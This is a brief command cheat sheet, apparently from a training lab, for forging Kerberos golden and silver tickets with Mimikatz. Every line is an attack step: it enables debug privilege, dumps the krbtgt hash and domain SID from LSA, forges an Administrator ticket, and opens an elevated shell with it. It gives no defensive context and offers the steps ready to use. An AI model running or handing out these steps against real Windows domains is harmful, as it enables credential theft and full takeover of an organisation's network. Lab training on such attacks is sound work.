# Commands: 

privilege::debug
    - ensure this outputs [privilege '20' ok]

lsadump::lsa /inject /name:krbtgt
    - This will dump the hash as well as the security identifier needed to create a Golden Ticket. 
    - To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:
    - for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

misc::cmd
    - This will open a new elevated command prompt with the given ticket in mimikatz.